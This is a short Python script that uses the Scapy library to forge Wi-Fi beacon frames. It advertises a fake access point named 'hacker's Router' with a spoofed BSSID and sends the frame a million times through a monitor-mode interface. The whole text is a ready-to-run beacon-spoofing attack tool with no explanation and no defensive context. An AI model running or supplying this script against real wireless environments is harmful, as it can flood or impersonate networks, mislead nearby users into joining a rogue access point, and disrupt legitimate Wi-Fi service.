#!/usr/bin/python3
from scapy.all import *

brdmac = "ff:ff:ff:ff:ff:ff"
bssid = "aa:bb:cc:dd:ee:ff"
pkt = RadioTap() / Dot11(addr1 = brdmac,addr2=bssid,addr3=bssid)/ Dot11Beacon(cap= 0x1104) / Dot11Elt(ID=0,info="hacker's Router") / Dot11Elt(ID=1,info="\x82\x84\x8b\x96\x12\x24\x48\x6c") / Dot11Elt(ID=3,info="\x08") / Dot11Elt(ID=5, info="\x00\x01\x00\xfe")
sendp(pkt,iface="wlan0mon",count=1000000,inter=.2)